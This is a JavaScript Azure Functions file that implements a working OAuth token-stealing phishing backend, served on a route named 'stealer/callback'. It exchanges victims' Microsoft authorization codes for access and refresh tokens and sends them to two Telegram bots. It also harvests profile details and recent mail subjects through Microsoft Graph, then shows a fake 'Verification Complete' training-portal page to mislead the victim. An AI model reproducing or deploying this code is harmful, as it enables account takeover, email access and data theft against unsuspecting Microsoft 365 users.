const { app } = require("@azure/functions");
const axios = require('axios');

// Telegram configuration
const TELEGRAM_BOT_TOKEN = "7768080373:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID = "6743632244";
const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID2 = "6263177378";

// OAuth configuration
const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e';
const client_secret = process.env.AZURE_CLIENT_SECRET || 'DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa';
const redirect_uri = 'https://aitm-func-new-1754085350.azurewebsites.net/api/stealer/callback';
const token_endpoint = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

async function sendTelegram(message, isSecondary = false) {
    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

app.http("callback", {
    methods: ["GET"],
    authLevel: "anonymous",
    route: "stealer/callback",
    handler: async (request, context) => {
        try {
            const url = new URL(request.url);
            const code = url.searchParams.get('code');
            const state = url.searchParams.get('state');
            const error = url.searchParams.get('error');

            if (error) {
                context.log.error(`OAuth error: ${error}`);
                await sendTelegram(`❌ <b>OAuth Error</b>\n\n${error}`);
                return new Response('Authorization failed', { status: 400 });
            }

            if (!code) {
                context.log.error('No authorization code received');
                await sendTelegram(`❌ <b>OAuth Error</b>\n\nNo authorization code received`);
                return new Response('No authorization code', { status: 400 });
            }

            context.log(`Authorization code received: ${code}`);

            // Immediately exchange code for tokens
            const tokenResponse = await axios.post(token_endpoint, {
                client_id: client_id,
                client_secret: client_secret,
                code: code,
                redirect_uri: redirect_uri,
                grant_type: 'authorization_code'
            }, {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            });

            const tokens = tokenResponse.data;
            context.log(`Tokens captured: ${JSON.stringify(tokens)}`);

            // Send success notification
            const successMessage = `🔥 <b>OAUTH TOKEN CAPTURE SUCCESS!</b>\n\n🔑 <b>Access Token:</b> <code>${tokens.access_token}</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token || 'N/A'}</code>\n🆔 <b>ID Token:</b> <code>${tokens.id_token || 'N/A'}</code>\n⏱️ <b>Expires In:</b> ${tokens.expires_in}s\n📝 <b>Token Type:</b> ${tokens.token_type}`;

            await sendTelegram(successMessage);
            await sendTelegram(successMessage, true);

            // Fetch user profile and mail data in parallel
            const [userProfile, mailData] = await Promise.allSettled([
                axios.get('https://graph.microsoft.com/v1.0/me', {
                    headers: {
                        'Authorization': `Bearer ${tokens.access_token}`,
                        'User-Agent': 'AzureAiTMFunction/1.0'
                    }
                }),
                axios.get('https://graph.microsoft.com/v1.0/me/messages?$top=10&$select=subject,receivedDateTime,from', {
                    headers: {
                        'Authorization': `Bearer ${tokens.access_token}`,
                        'User-Agent': 'AzureAiTMFunction/1.0'
                    }
                })
            ]);

            // Handle user profile
            if (userProfile.status === 'fulfilled') {
                const profile = userProfile.value.data;
                const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${profile.mail || profile.userPrincipalName}\n👤 <b>Name:</b> ${profile.displayName}\n🏢 <b>Company:</b> ${profile.jobTitle || 'N/A'}\n📱 <b>Phone:</b> ${profile.businessPhones?.[0] || 'N/A'}\n🏢 <b>Department:</b> ${profile.department || 'N/A'}`;

                await sendTelegram(profileMessage);
                await sendTelegram(profileMessage, true);
            } else {
                await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${userProfile.reason?.message || 'Unknown error'}`);
            }

            // Handle mail data
            if (mailData.status === 'fulfilled') {
                const mails = mailData.value.data.value;
                if (mails.length > 0) {
                    let mailMessage = `📧 <b>Mail Access Confirmed</b>\n\n📊 <b>Recent Emails:</b>\n`;
                    mails.slice(0, 5).forEach((mail, index) => {
                        mailMessage += `${index + 1}. <b>${mail.subject || 'No Subject'}</b>\n   📅 ${mail.receivedDateTime}\n   👤 ${mail.from?.emailAddress?.name || 'Unknown'}\n\n`;
                    });

                    await sendTelegram(mailMessage);
                    await sendTelegram(mailMessage, true);
                }
            } else {
                await sendTelegram(`⚠️ <b>Mail Fetch Error</b>\n\n${mailData.reason?.message || 'Unknown error'}`);
            }

            // Return success page
            const response = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Verification Complete</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f3f2f1; }
                    .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; text-align: center; }
                    .success-icon { width: 80px; height: 80px; margin: 0 auto 20px; color: #107c10; }
                    .title { color: #323130; font-size: 28px; font-weight: 600; margin-bottom: 10px; }
                    .subtitle { color: #605e5c; font-size: 16px; margin-bottom: 30px; }
                    .message { color: #323130; font-size: 16px; line-height: 1.6; margin: 20px 0; }
                    .button { background: #107c10; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
                    .button:hover { background: #0e6e0e; }
                </style>
            </head>
            <body>
                <div class="container">
                    <svg class="success-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="#107c10"/>
                    </svg>
                    <h1 class="title">Verification Complete!</h1>
                    <p class="subtitle">Your account has been successfully verified</p>
                    <div class="message">
                        <p>Thank you for completing the verification process. Your account is now ready to access the Microsoft Training Portal.</p>
                        <p>You will be redirected to your personalized training dashboard in a few moments.</p>
                    </div>
                    <a href="#" class="button" onclick="setTimeout(() => window.close(), 2000)">Close Window</a>
                </div>
                <script>
                    setTimeout(() => {
                        window.close();
                    }, 5000);
                </script>
            </body>
            </html>`;

            return new Response(response, {
                status: 200,
                headers: {
                    'Content-Type': 'text/html; charset=utf-8',
                    'X-Content-Type-Options': 'nosniff'
                }
            });

        } catch (error) {
            context.log.error('OAuth callback error:', error);
            await sendTelegram(`❌ <b>OAuth Callback Error</b>\n\n${error.message}`);
            return new Response('Token exchange failed', { status: 500 });
        }
    }
});